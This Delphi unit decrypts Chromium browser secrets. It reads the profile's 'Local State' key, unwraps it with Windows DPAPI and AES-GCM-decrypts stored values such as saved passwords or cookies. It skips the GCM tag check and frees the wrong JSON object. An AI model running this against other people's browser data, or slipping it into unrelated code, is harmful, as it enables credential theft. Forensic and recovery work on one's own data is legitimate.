unit ChromiumCrypto;

interface

uses
  System.SysUtils, System.Classes, System.IOUtils, System.JSON, System.NetEncoding,
  SYstem.Math, Winapi.Windows, DECCipherBase, DECCipherModes,
  DECCipherFormats, DECCiphers, DECFormat, DECHash;

type
  DATA_BLOB = record
    cbData: DWORD;
    pbData: PByte;
  end;
  PDATA_BLOB = ^DATA_BLOB;
  TCryptUnprotectData = function(pDataIn: PDATA_BLOB; ppszDataDescr: PWideChar;
    pOptionalEntropy: PDATA_BLOB; pvReserved: Pointer; pPromptStruct: Pointer;
    dwFlags: DWORD; pDataOut: PDATA_BLOB): BOOL; stdcall;

// Main decryption functions
function DecryptWithDPAPI(const EncryptedData: TBytes): TBytes;
function DecryptWithChromium(const MasterKey, EncryptedData: TBytes): TBytes;
function GetMasterKey(const ProfilePath: string): TBytes;

implementation

function DecryptWithDPAPI(const EncryptedData: TBytes): TBytes;
var
  DLLHandle: THandle;
  CryptUnprotectData: TCryptUnprotectData;
  DataIn, DataOut: DATA_BLOB;
begin
  SetLength(Result, 0);
  if Length(EncryptedData) = 0 then
    Exit;
  DLLHandle := LoadLibrary('Crypt32.dll');
  if DLLHandle = 0 then
    Exit;
  try
    @CryptUnprotectData := GetProcAddress(DLLHandle, 'CryptUnprotectData');
    if not Assigned(CryptUnprotectData) then
      Exit;
    DataIn.cbData := Length(EncryptedData);
    DataIn.pbData := @EncryptedData[0];
    if CryptUnprotectData(@DataIn, nil, nil, nil, nil, 0, @DataOut) then
    begin
      SetLength(Result, DataOut.cbData);
      Move(DataOut.pbData^, Result[0], DataOut.cbData);
      LocalFree(HLOCAL(DataOut.pbData));
    end;
  finally
    FreeLibrary(DLLHandle);
  end;
end;

function AESGCMDecrypt(const Key, Nonce, CipherText: TBytes): TBytes;
var
  Cipher: TCipher_AES;
  Data: TBytes;
begin
  SetLength(Result, 0);

  // Separate auth tag (last 16 bytes)
  SetLength(Data, Length(CipherText) - 16);
  Move(CipherText[0], Data[0], Length(Data));

  Cipher := TCipher_AES.Create;
  try
    Cipher.Mode := cmGCM;
    Cipher.Init(Key, Nonce);
    Result := Cipher.DecodeBytes(Data);
  finally
    Cipher.Free;
  end;
end;

function DecryptWithChromium(const MasterKey, EncryptedData: TBytes): TBytes;
const
  NONCE_SIZE = 12;
  MIN_SIZE = 15;  // 3 bytes prefix + 12 bytes nonce minimum
  GCM_TAG_SIZE = 16;
var
  Nonce, CipherText: TBytes;
begin
  SetLength(Result, 0);

  if Length(EncryptedData) < (MIN_SIZE + GCM_TAG_SIZE) then
    Exit;

  // Extract nonce (12 bytes after prefix)
  SetLength(Nonce, NONCE_SIZE);
  Move(EncryptedData[3], Nonce[0], NONCE_SIZE);

  // Get encrypted data portion (including auth tag)
  SetLength(CipherText, Length(EncryptedData) - (3 + NONCE_SIZE));
  Move(EncryptedData[3 + NONCE_SIZE], CipherText[0], Length(CipherText));

  Result := AESGCMDecrypt(MasterKey, Nonce, CipherText);
end;


function GetMasterKey(const ProfilePath: string): TBytes;
var
  LocalStatePath: string;
  JsonText: string;
  JsonValue: TJSONValue;
  EncodedKey: string;
  EncryptedKey, DecryptedKey: TBytes;
begin
  SetLength(Result, 0);
  try
    // Get path to Local State file
    LocalStatePath := TPath.Combine(TPath.GetDirectoryName(ProfilePath), 'Local State');

    // Check if file exists
    if not TFile.Exists(LocalStatePath) then
      Exit;

    // Read and parse JSON
    JsonText := TFile.ReadAllText(LocalStatePath);
    JsonValue := TJSONObject.ParseJSONValue(JsonText);
    try
      // Navigate JSON path: os_crypt -> encrypted_key
      if not (JsonValue is TJSONObject) then
        Exit;

      JsonValue := TJSONObject(JsonValue).GetValue('os_crypt');
      if not (JsonValue is TJSONObject) then
        Exit;

      EncodedKey := TJSONObject(JsonValue).GetValue('encrypted_key').Value;
      if EncodedKey = '' then
        Exit;

      // Decode base64
      EncryptedKey := TNetEncoding.Base64.DecodeStringToBytes(EncodedKey);

      // Remove 'DPAPI' prefix (first 5 bytes)
      if Length(EncryptedKey) <= 5 then
        Exit;

      SetLength(DecryptedKey, Length(EncryptedKey) - 5);
      Move(EncryptedKey[5], DecryptedKey[0], Length(DecryptedKey));

      // Decrypt the key using DPAPI
      Result := DecryptWithDPAPI(DecryptedKey);

    finally
      JsonValue.Free;
    end;
  except
    on E: Exception do
      SetLength(Result, 0);
  end;
end;

end.
